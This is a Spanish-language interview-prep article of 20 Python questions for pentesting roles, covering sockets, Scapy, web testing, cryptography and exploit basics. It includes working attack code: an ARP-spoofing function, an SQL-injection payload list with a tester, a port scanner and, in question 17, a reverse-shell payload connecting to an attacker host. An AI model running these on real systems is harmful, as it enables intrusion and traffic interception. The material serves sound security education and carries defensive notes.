---
title: "Python para Ciberseguridad: Preguntas y Respuestas para Pentesters"
description: "20 preguntas de entrevista sobre Python y seguridad para roles de pruebas de penetración e InfoSec. Cubre programación de sockets, Scapy, explotación web, criptografía y scripting de automatización."
date: 2026-02-11
tags: ["python", "interview", "security", "penetration-testing"]
keywords: ["python security interview", "infosec python questions", "scripting for hackers", "python pentest interview", "socket programming interview", "scapy interview questions", "python cryptography", "ethical hacking python", "security automation interview", "python exploit development"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "Python para Ciberseguridad: Preguntas y Respuestas para Pentesters",
    "description": "20 preguntas de entrevista sobre Python y seguridad que cubren programación de sockets, manipulación de paquetes, explotación web y automatización.",
    "proficiencyLevel": "Advanced",
    "inLanguage": "es"
  }
---

## Inicialización del Sistema

Python es el lenguaje dominante en la seguridad ofensiva y defensiva. Los roles de pruebas de penetración, red team, analista SOC e ingeniería de seguridad requieren fluidez en Python para automatización, desarrollo de herramientas y prototipado rápido. Los entrevistadores esperan que escribas código en el momento — desde clientes de sockets TCP hasta creadores de paquetes y scripts de exploits web. Esta guía cubre 20 preguntas que evalúan la intersección entre la programación en Python y el conocimiento de seguridad.

**¿Necesitas snippets de código listos?** Mantén abierto nuestro [Cheatsheet de Scripting Python para Seguridad](/cheatsheets/python-security-scripts/) durante tu preparación.

---

## Redes y Sockets

<details>
<summary><strong>1. ¿Cómo se crea un cliente TCP en Python?</strong></summary>
<br>

```python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("target.com", 80))
client.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

Puntos clave: `AF_INET` = IPv4, `SOCK_STREAM` = TCP. Para UDP, usa `SOCK_DGRAM` y `sendto()`/`recvfrom()` en lugar de `connect()`/`send()`/`recv()`. Siempre establece timeouts en scripts de producción: `client.settimeout(5)`.
</details>

<details>
<summary><strong>2. ¿Cómo funciona el three-way handshake TCP a nivel de socket?</strong></summary>
<br>

Cuando llamas a `client.connect((host, port))`, la librería socket de Python activa el sistema operativo para realizar el three-way handshake:

1. El SO envía un paquete **SYN** al servidor.
2. El servidor responde con **SYN-ACK**.
3. El SO envía **ACK** — conexión establecida, `connect()` retorna.

Si el handshake falla (puerto cerrado, timeout), `connect()` lanza `ConnectionRefusedError` o `socket.timeout`. Con Scapy, puedes crear y enviar manualmente cada paquete para realizar escaneos SYN sigilosos — enviando SYN, verificando el SYN-ACK, y luego enviando RST en lugar de ACK para evitar completar el handshake.
</details>

<details>
<summary><strong>3. Escribe un escáner de puertos multi-threaded en Python.</strong></summary>
<br>

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            with lock:
                open_ports.append(port)
    except Exception:
        pass

def worker():
    while not queue.empty():
        scan(queue.get())
        queue.task_done()

for p in range(1, 1025):
    queue.put(p)

for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

queue.join()
print(f"Open ports: {sorted(open_ports)}")
```

Puntos de discusión: Por qué hilos y no procesos (I/O bound, no CPU bound), por qué `connect_ex` en lugar de `connect` (retorna un código de error en vez de lanzar una excepción), y por qué `settimeout` es crítico (previene bloqueos en puertos filtrados).
</details>

<details>
<summary><strong>4. ¿Cuál es la diferencia entre `socket.connect()` y `socket.connect_ex()`?</strong></summary>
<br>

- `connect()`: Lanza una excepción (`ConnectionRefusedError`, `TimeoutError`) si la conexión falla. Adecuado para scripts donde un fallo debe detener la ejecución.
- `connect_ex()`: Retorna un código de error en lugar de lanzar una excepción. Retorna `0` en caso de éxito, un errno distinto de cero en caso de fallo. Mejor para escáneres de puertos donde necesitas verificar cientos de puertos sin la sobrecarga de try/except.
</details>

## Scapy y Manipulación de Paquetes

<details>
<summary><strong>5. ¿Qué es Scapy y por qué se prefiere sobre los raw sockets?</strong></summary>
<br>

Scapy es una librería Python para la manipulación interactiva de paquetes. Te permite forjar, enviar, capturar y diseccionar paquetes de red en cualquier capa de protocolo.

Ventajas sobre los raw sockets:
- **Construcción capa por capa**: Construye paquetes apilando capas de protocolo: `IP()/TCP()/Raw()`.
- **Soporte de protocolos**: Soporte integrado para cientos de protocolos (ARP, DNS, ICMP, TCP, UDP, 802.11).
- **Análisis de respuestas**: Empareja automáticamente las solicitudes con las respuestas y las disecciona.
- **Modo interactivo**: REPL para experimentación en vivo con paquetes.

Los raw sockets requieren construcción manual de paquetes a nivel de bytes y permisos a nivel del sistema operativo. Scapy abstrae esto mientras proporciona el mismo nivel de control.
</details>

<details>
<summary><strong>6. ¿Cómo se realiza ARP spoofing con Scapy?</strong></summary>
<br>

```python
from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # Claim to be this IP
    )
    sendp(packet, verbose=0)
```

Esto envía una respuesta ARP no solicitada que le dice al objetivo que `spoof_ip` está en tu dirección MAC. El tráfico destinado a `spoof_ip` se redirige a tu máquina. Combinado con el reenvío de IP, esto permite ataques man-in-the-middle.

**Defensa**: Entradas ARP estáticas, Dynamic ARP Inspection (DAI), o herramientas de monitoreo ARP como arpwatch.
</details>

<details>
<summary><strong>7. ¿Cómo se captura tráfico de red y se filtran protocolos específicos?</strong></summary>
<br>

```python
from scapy.all import sniff, TCP, IP

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        print(f"{src}:{sport} -> {dst}:{dport}")

# Capture HTTP traffic only
sniff(filter="tcp port 80", prn=packet_handler, count=50, store=0)
```

El parámetro `filter` usa la sintaxis BPF (Berkeley Packet Filter). `store=0` previene mantener paquetes en memoria. Requiere privilegios root/admin.
</details>

## Seguridad Web

<details>
<summary><strong>8. ¿Cómo se automatizan las solicitudes web para pruebas de seguridad?</strong></summary>
<br>

```python
import requests

session = requests.Session()

# Custom headers to bypass basic WAFs
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "127.0.0.1"
})

# Login and maintain session cookies
login_data = {"username": "admin", "password": "test"}
session.post("http://target.com/login", data=login_data)

# Authenticated request (cookies auto-included)
response = session.get("http://target.com/admin/dashboard")
print(response.status_code)
```

Conceptos clave: `Session()` mantiene las cookies entre solicitudes. Siempre establece `timeout` en scripts de producción. Usa `verify=False` solo en entornos de prueba controlados (desactiva la verificación SSL).
</details>

<details>
<summary><strong>9. ¿Cómo probarías una inyección SQL usando Python?</strong></summary>
<br>

```python
import requests

url = "http://target.com/search"
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--"
]

for payload in payloads:
    r = requests.get(url, params={"q": payload}, timeout=10)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Possible SQLi with: {payload}")
    if r.elapsed.seconds >= 5:
        print(f"[!] Time-based SQLi confirmed: {payload}")
```

Esto prueba inyección SQL basada en errores (mensajes de error en la respuesta), basada en union (salida alterada) y blind basada en tiempo (respuesta retrasada). Para pentests profesionales, usa SQLMap — pero los entrevistadores esperan que entiendas los mecanismos subyacentes.
</details>

<details>
<summary><strong>10. ¿Cuál es la diferencia entre requests.get() y urllib?</strong></summary>
<br>

- **requests**: Librería de terceros. API limpia, análisis JSON automático, gestión de sesiones, connection pooling, soporte de proxy. El estándar de la industria para HTTP en Python.
- **urllib**: Librería estándar. Más verbosa, de nivel más bajo. Sin gestión de sesiones. Útil cuando no puedes instalar paquetes de terceros (entornos restringidos, funciones lambda).

Para pruebas de seguridad, `requests` se prefiere por su simplicidad. Para desarrollo de exploits donde minimizar dependencias importa, `urllib` o incluso raw sockets pueden ser mejores.
</details>

## Criptografía

<details>
<summary><strong>11. ¿Cuál es la diferencia entre hashing y cifrado?</strong></summary>
<br>

- **Hashing**: Función unidireccional. Entrada → resumen de tamaño fijo. No se puede revertir. La misma entrada siempre produce la misma salida. Usado para verificación de integridad, almacenamiento de contraseñas. Ejemplos: SHA-256, bcrypt, Argon2.
- **Cifrado**: Función bidireccional. Texto plano → texto cifrado (con una clave) → texto plano (con la clave). Diseñado para ser revertido por el poseedor de la clave. Usado para confidencialidad. Ejemplos: AES, RSA, ChaCha20.

Error común: Usar MD5/SHA para "cifrar" datos. El hashing no es cifrado — no puedes recuperar los datos originales de un hash (sin fuerza bruta).
</details>

<details>
<summary><strong>12. ¿Cómo se implementa el cifrado AES en Python?</strong></summary>
<br>

```python
from cryptography.fernet import Fernet

# Generate a key (store securely!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
plaintext = b"sensitive data"
ciphertext = cipher.encrypt(plaintext)

# Decrypt
decrypted = cipher.decrypt(ciphertext)
assert decrypted == plaintext
```

Fernet usa AES-128-CBC con HMAC-SHA256 para cifrado autenticado. Para control de nivel más bajo, usa `cryptography.hazmat` con AES-GCM (cifrado autenticado, no necesita HMAC separado).

Nunca implementes tus propias primitivas criptográficas. Usa librerías establecidas.
</details>

<details>
<summary><strong>13. ¿Cómo se hashean contraseñas de forma segura en Python?</strong></summary>
<br>

```python
import bcrypt

# Hash a password
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

Por qué bcrypt en lugar de SHA-256: bcrypt es deliberadamente **lento** (rounds configurables), haciendo los ataques de fuerza bruta impracticables. SHA-256 está diseñado para ser rápido — un atacante puede calcular miles de millones por segundo con GPUs. Alternativas: Argon2 (memory-hard, recomendado para nuevos proyectos), PBKDF2 (ampliamente soportado).
</details>

## Automatización y Scripting

<details>
<summary><strong>14. ¿Cómo se maneja la ejecución de subprocesos de forma segura en Python?</strong></summary>
<br>

```python
import subprocess

# SECURE: Pass arguments as a list (no shell injection)
result = subprocess.run(
    ["nmap", "-sV", "-p", "80,443", "192.168.1.1"],
    capture_output=True, text=True, timeout=60
)
print(result.stdout)

# INSECURE: Never do this with user input
# subprocess.run(f"nmap {user_input}", shell=True)  # Command injection!
```

Reglas: Nunca uses `shell=True` con entrada controlada por el usuario. Siempre pasa los comandos como listas. Establece `timeout` para prevenir bloqueos. Usa `capture_output=True` para recopilar stdout/stderr.
</details>

<details>
<summary><strong>15. ¿Cómo se analizan archivos de log con Python?</strong></summary>
<br>

```python
import re
from collections import Counter

failed_logins = Counter()

with open("/var/log/auth.log") as f:
    for line in f:
        match = re.search(r"Failed password .* from (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            failed_logins[match.group(1)] += 1

# Top 10 offending IPs
for ip, count in failed_logins.most_common(10):
    print(f"{ip}: {count} failed attempts")
```

Para archivos grandes, siempre lee línea por línea (nunca `.read()` el archivo completo en memoria). Usa `re.compile()` para precompilar patrones regex para mejor rendimiento.
</details>

<details>
<summary><strong>16. ¿Qué es el GIL y cómo afecta a las herramientas de seguridad?</strong></summary>
<br>

El **Global Interpreter Lock (GIL)** impide que múltiples hilos ejecuten bytecode Python simultáneamente. Solo un hilo se ejecuta a la vez en CPython.

Impacto en herramientas de seguridad:
- **Escáneres de puertos** (I/O-bound): El threading funciona bien. Los hilos pasan la mayor parte del tiempo esperando respuestas de red, no ejecutando código Python. El GIL se libera durante operaciones de I/O.
- **Crackers de contraseñas** (CPU-bound): El threading es inútil. Usa `multiprocessing` para aprovechar múltiples núcleos de CPU, o usa extensiones C (hashcat, John the Ripper) para cracking real.
- **Alternativa**: Usa `asyncio` para herramientas de red de alta concurrencia (miles de conexiones simultáneas con sobrecarga mínima).
</details>

## Desarrollo de Exploits

<details>
<summary><strong>17. ¿Cómo se crea un payload de reverse shell en Python?</strong></summary>
<br>

```python
import socket, subprocess, os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])
```

Esto redirige stdin/stdout/stderr a un socket TCP, dando al atacante una shell interactiva. En entrevistas, explica el concepto y la defensa (filtrado de salida, segmentación de red, monitoreo EDR) — no solo el código. Esto es solo para pruebas autorizadas y desafíos CTF.
</details>

<details>
<summary><strong>18. ¿Qué es la serialización y por qué es un riesgo de seguridad?</strong></summary>
<br>

La serialización convierte objetos a bytes para almacenamiento/transmisión. La **deserialización** de datos no confiables es una vulnerabilidad crítica.

```python
import pickle

# DANGEROUS: Never unpickle untrusted data
data = pickle.loads(untrusted_bytes)  # Can execute arbitrary code!
```

El módulo `pickle` de Python puede ejecutar código arbitrario durante la deserialización. Un atacante puede crear un payload pickle que genera una reverse shell cuando se carga.

Alternativas seguras: Usa `json` para intercambio de datos (no es posible la ejecución de código). Si debes deserializar objetos complejos, usa validación `jsonschema` o protobuf/msgpack con esquemas estrictos.
</details>

<details>
<summary><strong>19. ¿Cómo se interactúa con APIs REST para recopilación OSINT?</strong></summary>
<br>

```python
import requests

# Shodan API - find exposed services
api_key = "YOUR_API_KEY"
target = "8.8.8.8"
response = requests.get(
    f"https://api.shodan.io/shodan/host/{target}",
    params={"key": api_key}
)
data = response.json()

for service in data.get("data", []):
    print(f"Port {service['port']}: {service.get('product', 'unknown')}")
```

APIs OSINT comunes: Shodan (dispositivos expuestos), VirusTotal (análisis de malware), Have I Been Pwned (datos de brechas), SecurityTrails (historial DNS). Siempre respeta los límites de frecuencia y los términos de servicio.
</details>

<details>
<summary><strong>20. ¿Cómo se escribe un keylogger en Python y cómo se detecta uno?</strong></summary>
<br>

Respuesta conceptual (contexto de entrevista):
Un keylogger se engancha al sistema de entrada del SO para capturar pulsaciones de teclas. En Linux, lee de los dispositivos `/dev/input/event*`. En Windows, usa la API `SetWindowsHookEx` mediante `ctypes` o `pynput`.

**Métodos de detección**:
- Monitorea procesos que acceden a dispositivos de entrada: `lsof /dev/input/*`.
- Verifica imports inesperados de `pynput`, `keyboard` o `ctypes` en procesos Python en ejecución.
- Firmas EDR/antivirus para patrones de keylogger conocidos.
- Monitoreo de red para exfiltración (los keyloggers necesitan enviar datos a algún lugar).

En entrevistas, siempre enfatiza la perspectiva defensiva: cómo detectar, prevenir y responder a los keyloggers — no solo cómo construirlos.
</details>
